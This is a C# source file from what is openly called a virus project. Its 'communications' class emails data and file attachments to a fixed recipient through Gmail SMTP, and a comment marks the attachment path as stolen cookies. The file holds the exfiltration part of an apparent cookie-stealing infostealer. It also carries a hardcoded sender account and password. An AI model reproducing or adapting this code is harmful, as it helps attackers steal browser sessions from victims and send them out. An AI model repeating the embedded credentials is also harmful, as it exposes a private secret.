

using System.Net;
using System.Net.Mail;

namespace virusMain
{
    class communications
    {
        string email_me = "sansanich992@gmail.com";
        string email_me_pass = "Rtrtph74";
        string email_to = "gigantpro2000@gmail.com";
        public void sendmessage(string name, string body)
        {
            // отправитель - устанавливаем адрес и отображаемое в письме имя
            MailAddress from = new MailAddress(email_me, name);
            // кому отправляем
            MailAddress to = new MailAddress(email_to);
            // создаем объект сообщения
            MailMessage m = new MailMessage(from, to);
            // тема письма
            m.Subject = name;
            // текст письма
            m.Body = body;
            // письмо представляет код html
            m.IsBodyHtml = true;
            // адрес smtp-сервера и порт, с которого будем отправлять письмо
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
            // логин и пароль
            smtp.Credentials = new NetworkCredential(email_me, email_me_pass);
            smtp.EnableSsl = true;
            smtp.Send(m);
        }
        public void sendmessage(string name, string body, string road_to_attachment)
        {
            // отправитель - устанавливаем адрес и отображаемое в письме имя
            MailAddress from = new MailAddress(email_me, name);
            // кому отправляем
            MailAddress to = new MailAddress(email_to);
            // создаем объект сообщения
            MailMessage m = new MailMessage(from, to);

            //отправление куки
            m.Attachments.Add(new Attachment(road_to_attachment));
            // тема письма
            m.Subject = name;
            // текст письма
            m.Body = body;
            // письмо представляет код html
            m.IsBodyHtml = true;
            // адрес smtp-сервера и порт, с которого будем отправлять письмо
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
            // логин и пароль
            smtp.Credentials = new NetworkCredential(email_me, email_me_pass);
            smtp.EnableSsl = true;
            smtp.Send(m);
        }

    }
}
